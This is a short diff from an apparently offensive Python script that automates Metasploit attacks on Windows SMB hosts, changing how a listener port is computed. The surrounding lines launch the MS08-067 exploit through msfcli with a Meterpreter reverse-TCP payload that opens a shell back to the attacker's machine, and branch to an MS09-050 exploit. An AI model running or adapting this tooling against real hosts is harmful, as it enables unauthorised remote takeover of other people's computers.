@@ -44,7 +44,7 @@ def scan(RHOST, unsafe):
 
 	
 def msfsmb(host, sploit):
-	LPORT = '444'+host.split('.')[3]
+	LPORT = '44'+host.split('.')[3]
 	if sploit == 'MS08-067':
 		subprocess.call("sudo gnome-terminal -t \"MSF\" -x bash -c \"msfcli windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST="+LHOST+" LPORT="+LPORT+" RHOST="+host+" E;\" &", shell=True)
 	if sploit == 'MS09-050':
